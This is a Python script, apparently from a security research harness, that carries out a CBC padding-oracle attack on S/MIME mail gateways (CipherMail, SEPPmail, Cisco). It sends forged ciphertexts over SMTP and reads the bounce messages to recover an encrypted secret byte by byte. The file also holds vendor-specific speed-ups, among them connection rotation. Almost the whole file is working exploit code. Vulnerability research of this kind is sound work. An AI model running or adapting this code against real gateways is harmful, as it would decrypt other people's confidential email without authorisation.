#!/usr/bin/env -S authbind --deep uv run
# /// script
# dependencies = ["asn1crypto>=1.5.1", "aiosmtpd>=1.4"]
# ///
"""CBC padding-oracle attack via DSN-bounce reflection.

Encrypts a secret code to the target profile's S/MIME certificate, then
recovers it byte-by-byte by sending malleated ciphertexts and watching the
DSN bounce that the gateway reflects back after it does (or doesn't)
successfully decrypt/unpad the forged message. The oracle listener binds on
the profile's external/bounce-capture host (see `PROFILES` in
`smime_harness_lib.py`) to receive these bounces.

Usage: ./padding_oracle_bounce.py <profile> [--specialized] [--trials N] [--parallel N]
  profile        ciphermail | seppmail | cisco
  --specialized  use the per-vendor optimized fast path (ciphermail's
                 7-bit-sanitization-aware decoder, seppmail's carrier-email
                 batching, cisco's rotating-connection sender) instead of
                 the generic byte-at-a-time oracle.
"""

import asyncio
from email.mime.message import MIMEMessage
from email.mime.multipart import MIMEMultipart
import smtplib
import sys
import time
from pathlib import Path
import queue
import threading

_ROOT = Path(__file__).resolve().parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import smime_harness_lib as H

MET = Path(".cache-metrics/padding_oracle_bounce")

_CURRENT_BATCH = 0


def _send_batch(conn: smtplib.SMTP, msgs: list, batch: int) -> None:
    for m in msgs:
        if _CURRENT_BATCH == batch:
            conn.send_message(m)


async def batch(cls, orc, der, ivs, ct, tag, all_slots=False):
    global _CURRENT_BATCH
    p = f"{ct.hex()} {tag}"
    orc.reset(p, len(ivs), all_slots)
    n = len(cls)
    buckets: list[list] = [[] for _ in range(n)]
    for i, iv in enumerate(ivs):
        msg = H.wrap_pkcs7(
            H.pack_iv_ct(der, bytes(16), iv + ct),
            "probe@external.test",
            {},
        )
        msg["Subject"] = f"{p} {i:02x}"
        buckets[i % n].append(msg)
    batch_id = _CURRENT_BATCH
    send_tasks = [
        asyncio.create_task(asyncio.to_thread(_send_batch, cls[j], buckets[j], batch_id))
        for j in range(n)
        if buckets[j]
    ]
    slots = await orc.wait_slots()
    _CURRENT_BATCH += 1
    await asyncio.gather(*send_tasks)
    return slots


async def dec1(cls, orc, der, ct16, byte_s: list[float]):
    byte_t0 = time.perf_counter()
    r = await batch(cls, orc, der, [bytes(15) + bytes([i]) for i in range(256)], ct16, "b1", all_slots=True)
    tail = None
    for i, v in enumerate(r):
        if v:
            rr = await batch(cls, orc, der, [bytes(14) + bytes([1, i])], ct16, "ck", all_slots=True)
            if all(rr):
                tail = bytes([i ^ 1])
                break
    assert tail
    byte_s.append(time.perf_counter() - byte_t0)
    for rnd in range(2, 17):
        t = bytes([x ^ rnd for x in tail])
        byte_t0 = time.perf_counter()
        r = await batch(cls, orc, der, [bytes(16 - rnd) + bytes([j]) + t for j in range(256)], ct16, f"b{rnd}")
        assert r.count(True) == 1
        tail = bytes([r.index(True) ^ rnd]) + tail
        byte_s.append(time.perf_counter() - byte_t0)
    return tail


"""
Allegedly based on
  - Feige, Lovasz, Tetali, “Approximating Min-Sum Set Cover”: formalizes ordering sets to minimize average first-cover time, which matches your loop’s structure. https://tetali.math.gatech.edu/PUBLIS/mssc_final.pdf
  - Berend et al., “Optimal ordering of independent tests with precedence constraints”: frames the same kind of “stop once a decision can be made” test-order problem. https://doi.org/10.1016/j.dam.2013.07.014
  - Knuth, “Optimum Binary Search Trees”: relevant if you generalize this into an arbitrary decision tree rather than a fixed linear scan. https://www.ime.usp.br/~coelho/mac0323-2019/aulas/aula11/Knuth71.pdf
"""
_CIPHERMAIL_7BIT_INNER_ORDER = (0x01, 0x08, 0x09, 0x10, 0x11, 0x18, 0x19, 0x02, 0x0a, 0x0b, 0x12, 0x13, 0x1a, 0x1b)

async def dec_byte_ciphermail_7bit(cls, orc, der, iv, ct, bi) -> int:
    tag = f"{ct[:16].hex()}.{bi:02x}"
    async def test(d: int) -> bool:
        ivp = bytearray(iv)
        ivp[bi] ^= d
        msg = H.wrap_pkcs7(
            H.pack_iv_ct(der, ivp, ct),
            "probe@external.test",
            {},
        )
        msg["Subject"] = f"{tag} {d:02x}"
        cls[0].send_message(msg)
        while True:
            bounce = await orc.wait_bounce()
            hdr_blob = H.dsn_rfc822_headers(bounce.as_bytes())
            assert hdr_blob
            subj = H.subject_from_rfc822_headers_blob(hdr_blob) or ""
            if not subj:
                return True
            if tag not in subj:
                continue
            if b"smime-illegal-chars-found" in hdr_blob.lower():
                return False
            if "[decrypted]" not in subj:
                raise ValueError
            return True
    for d in range(0x20, 0x80, 0x20):
        if not await test(d):
            for d2 in _CIPHERMAIL_7BIT_INNER_ORDER:
                if await test(d ^ d2):
                    d ^= d2
                    break
            else:
                d ^= 3
            break
    else:
        d = 0x00
        if await test(0x10):
            for d in range(0x30, 0x80, 0x20):
                if d == 0x70 or not await test(d):
                    break
            d ^= 0x10

    if ((d&0x1f) in _CIPHERMAIL_7BIT_INNER_ORDER[7:]) or (d&0x1f == 3) or not await test(d^0x03):
        return 0x0d ^ d
    elif await test(d^0x04):
        return 0x09 ^ d
    else:
        return 0x0a ^ d

async def trial_ciphermail_7bit(guest_smtp, capture_host, orc, der, parallel: int, byte_s: list[float]):
    iv, ct = H.cbc_nonce_ct(der)
    cls = [_mk_sender(guest_smtp) for _ in range(parallel)]
    ctrl = H.start_oracle(orc, capture_host)
    try:
        pt = b""
        for i in range(len(ct)):
            try:
                byte_t0 = time.perf_counter()
                b = await dec_byte_ciphermail_7bit(cls, orc, der, iv, ct, i%16)
            except ValueError:
                break
            finally:
                byte_s.append(time.perf_counter() - byte_t0)
            pt += bytes([b])
            if i & 0xf == 0xf:
                iv = ct[:16]
                ct = ct[16:]
        l = 16 - (len(pt) % 16)
        pt += bytes([l]) * l
        print(pt)
        return True
    finally:
        ctrl.stop()
        for cl in cls:
            cl.quit()

def _mk_sender(host: str):
    return smtplib.SMTP(host, 25, timeout=60)

async def trial(guest_smtp, capture_host, orc, der, parallel: int, byte_s: list[float]):
    iv, ct = H.cbc_nonce_ct(der)
    cls = [_mk_sender(guest_smtp) for _ in range(parallel)]
    stream = iv + ct
    ctrl = H.start_oracle(orc, capture_host)
    try:
        pt = b""
        for bi in range(len(ct) // 16):
            i = bi * 16
            d = await dec1(cls, orc, der, ct[i : i + 16], byte_s)
            pt += H.xor(stream[i : i + 16], d)
        print(pt)
        return True
    finally:
        time.sleep(20)
        ctrl.stop()
        for cl in cls:
            cl.quit()

async def run(args, guest_smtp, capture_host, cert, orc, parallel: int):
    outs = []
    trial_s = []
    byte_s = []
    for _ in range(args.trials):
        trial_byte_s: list[float] = []
        trial_t0 = time.perf_counter()
        der = H.secret_code(cert)
        outs.append(
            await trial(guest_smtp, capture_host, orc, der, parallel, trial_byte_s)
        )
        trial_s.append(time.perf_counter() - trial_t0)
        byte_s.append(trial_byte_s)
    return sum(x is True for x in outs), len(outs), trial_s, byte_s

def _mk_sender_seppmail(host: str):
    return smtplib.SMTP(host, 25, timeout=300)

def _send_batch_seppmail(conn: smtplib.SMTP, msgs: list, batch: int) -> None:
    base = MIMEMultipart("mixed")
    base["Subject"] = "Carrier email"
    base["From"] = "probe@external.test"
    base["To"] = H.BOUNCE_RCPT
    for msg in msgs:
        msg = MIMEMessage(msg)
        base.attach(msg)
    conn.send_message(base)

class CiscoSMTP:
    def __init__(self, host: str):
        self.host = host
        self.conn = smtplib.SMTP(host, 25)
        self.pending = queue.Queue()
        self.thread = threading.Thread(target=self.next)
        self.thread.start()
        self.count = 0
    
    def next(self):
        self.pending.put(smtplib.SMTP(self.host, 25))
    
    def rotate(self):
        self.conn.quit()
        self.conn = self.pending.get()
        self.thread.join()
        self.thread = threading.Thread(target=self.next)
        self.thread.start()

    def send_message(self, msg: MIMEMultipart):
        self.conn.send_message(msg)
        self.count += 1
        if self.count == 10:
            self.rotate()
            self.count = 0

    def quit(self):
        self.conn.quit()
        self.pending.get().quit()

def _mk_sender_cisco(host: str):
    return CiscoSMTP(host)

def main() -> None:
    global _mk_sender, _send_batch, trial
    a = H.argparser()
    a.add_argument("--specialized", action="store_true")
    a.add_argument("--parallel", type=int, default=5)
    args = H.parse_args(a)

    parallel = args.parallel
    orc = None
    if args.specialized:
        if args.profile == "seppmail":
            _send_batch = _send_batch_seppmail
            _mk_sender = _mk_sender_seppmail
            parallel = 1
        elif args.profile == "ciphermail":
            trial = trial_ciphermail_7bit
            orc = H.BounceListener()
            orc.needle = b""
            parallel = 1
        else:
            _mk_sender = _mk_sender_cisco

    guest_smtp, capture_host = H.PROFILES[args.profile]
    cert = H.cert_pem(args.profile)
    if not orc:
        orc = H.PadOracle(args.profile)

    async def _():
        t0 = time.perf_counter()
        ok, n, trial_s, byte_s = await run(args, guest_smtp, capture_host, cert, orc, parallel)
        timing = H.attack_timing_metrics(time.perf_counter() - t0, trial_s, byte_s)
        print(H.metrics_json(MET, args.profile, ok=ok, n=n, **timing))

    asyncio.run(_())


if __name__ == "__main__":
    main()
